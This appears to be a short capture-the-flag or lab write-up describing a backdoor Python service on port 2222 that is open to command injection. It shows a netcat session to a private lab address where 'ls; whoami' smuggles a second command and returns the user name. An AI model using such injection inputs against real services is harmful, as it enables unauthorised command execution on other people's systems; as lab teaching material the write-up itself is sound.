# Challenges

---

## Challenge 1 - Backdoor Services

### Python Vulnerability
This python script is vulnerable to command injection and runs on port 2222

You can exploit it by connecting using netcat
```
$ nc 192.168.232.131 2222
Enter a Command: ls; whoami
elliot
```

---
